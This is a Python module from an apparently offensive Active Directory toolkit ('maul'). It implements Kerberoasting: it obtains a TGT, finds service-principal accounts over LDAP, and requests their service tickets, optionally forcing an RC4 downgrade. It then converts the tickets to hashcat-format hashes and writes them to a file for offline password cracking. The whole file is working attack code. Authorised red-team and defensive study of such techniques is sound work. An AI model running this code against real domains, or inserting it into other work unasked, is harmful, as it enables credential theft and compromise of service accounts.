"""Kerberoasting — request TGS tickets for SPN-bearing accounts and extract crackable hashes."""

from __future__ import annotations

import logging
from dataclasses import dataclass, field

from maul.core.ldap_client import get_attr, get_attr_first
from maul.utils.ldap_filters import KERBEROASTABLE

log = logging.getLogger(__name__)


@dataclass
class KerberoastResult:
    username: str
    domain:   str
    spn:      str
    etype:    int           # 17=AES128, 18=AES256, 23=RC4
    hash_str: str           # hashcat format
    error:    str = ""


def run(
    conn,
    *,
    only_rc4: bool = False,
) -> list[KerberoastResult]:
    """Enumerate kerberoastable accounts and request TGS tickets.

    Requires conn.username/password or conn.nthash/aes_key so that a TGT
    can be obtained.  If Kerberos auth is already in use (KRB5CCNAME), the
    existing ccache is loaded instead.

    Args:
        conn:      ADConnection (must be connected and authenticated)
        only_rc4:  If True, request RC4-downgraded tickets even for AES accounts.

    Returns a list of KerberoastResult objects.
    """
    from maul.auth.kerberos import get_tgt, get_tgt_from_ccache, get_tgs, tgs_to_hashcat
    from maul.auth.ntlm import parse_hash

    domain = conn.domain
    dc     = conn.dc

    # ── get TGT ──────────────────────────────────────────────────────────────
    tgt, cipher, old_sk, session_key = _acquire_tgt(conn)

    # ── enumerate targets ─────────────────────────────────────────────────────
    entries = conn.ldap_search(
        KERBEROASTABLE,
        attributes=["sAMAccountName", "servicePrincipalName",
                    "msDS-SupportedEncryptionTypes"],
    )

    results: list[KerberoastResult] = []

    for entry in entries:
        sam  = str(get_attr_first(entry, "sAMAccountName") or "")
        spns = get_attr(entry, "servicePrincipalName") or []
        if isinstance(spns, str):
            spns = [spns]
        enc_types_raw = get_attr_first(entry, "msDS-SupportedEncryptionTypes")
        enc_types = int(enc_types_raw) if enc_types_raw else 0

        # Pick the first SPN; all share the same key
        for spn in spns:
            spn_str = str(spn)
            try:
                # Downgrade to RC4 if requested and account supports it
                if only_rc4:
                    tgs_bytes, _, _, _ = _request_rc4_tgs(
                        tgt, cipher, session_key, spn_str, domain, dc
                    )
                else:
                    tgs_bytes, _, _, _ = get_tgs(
                        tgt, cipher, session_key, spn_str, domain, dc
                    )
                hash_str = tgs_to_hashcat(tgs_bytes, sam, domain, spn_str)
                etype = _etype_from_hash(hash_str)
                results.append(KerberoastResult(
                    username=sam, domain=domain,
                    spn=spn_str, etype=etype,
                    hash_str=hash_str,
                ))
            except Exception as exc:
                log.debug("TGS request failed for %s/%s: %s", sam, spn_str, exc)
                results.append(KerberoastResult(
                    username=sam, domain=domain,
                    spn=spn_str, etype=0,
                    hash_str="", error=str(exc),
                ))
            break  # one hash per user is enough

    return results


def hashes_to_file(results: list[KerberoastResult], path: str) -> int:
    """Write valid hashes to a file, one per line. Returns count written."""
    lines = [r.hash_str for r in results if r.hash_str]
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines))
        if lines:
            fh.write("\n")
    return len(lines)


# ── internals ─────────────────────────────────────────────────────────────────

def _acquire_tgt(conn) -> tuple:
    """Get a TGT from the connection's credentials."""
    import os
    from maul.auth.kerberos import get_tgt, get_tgt_from_ccache
    from maul.auth.ntlm import parse_hash

    if conn.use_kerberos or os.environ.get("KRB5CCNAME"):
        return get_tgt_from_ccache()

    lmhash = nthash = ""
    if conn.nthash:
        lmhash, nthash = parse_hash(conn.nthash)

    return get_tgt(
        username=conn.username or "",
        domain=conn.domain,
        dc=conn.dc,
        password=conn.password or "",
        lmhash=lmhash,
        nthash=nthash,
        aes_key=conn.aes_key or "",
    )


def _request_rc4_tgs(tgt, cipher, session_key, spn, domain, dc) -> tuple:
    """Request a TGS with explicit RC4 etype preference (downgrade)."""
    from impacket.krb5.kerberosv5 import getKerberosTGS
    from impacket.krb5.types import Principal
    from impacket.krb5 import constants

    server = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
    # Pass etype list to force RC4
    return getKerberosTGS(
        server, domain, dc, tgt, cipher, session_key,
        [int(constants.EncryptionTypes.rc4_hmac.value)],
    )


def _etype_from_hash(hash_str: str) -> int:
    try:
        return int(hash_str.split("$")[2])
    except Exception:
        return 0
